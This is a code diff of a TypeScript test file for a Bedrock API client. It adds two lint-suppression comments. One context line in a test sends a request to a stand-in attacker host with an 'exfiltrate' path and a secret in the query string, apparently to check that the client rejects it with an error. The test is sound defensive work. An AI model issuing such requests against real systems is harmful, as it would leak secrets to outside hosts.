@@ -59,6 +59,7 @@ const INPUT_TOKENS_BODY = {
   input_tokens: 1,
 };
 
+// oxlint-disable-next-line anti-slop/no-unknown-parameters -- The response fixture covers several API payload contracts and intentionally malformed bodies.
 function jsonResponse(body: unknown = RESPONSE_BODY): Response {
   return new globalThis.Response(JSON.stringify(body), {
     status: 200,
@@ -461,6 +462,7 @@ describe('instantiate bedrock client', () => {
           method: 'get',
           path: 'https://attacker.example/private/exfiltrate?secret=never-log-this-query',
         })
+        // oxlint-disable-next-line anti-slop/no-unknown-parameters -- Failures and rejection reasons can be arbitrary JavaScript values; preserve them until inspection or forwarding.
         .catch((error: unknown) => error);
 
       expect(rejection).toBeInstanceOf(OpenAIError);
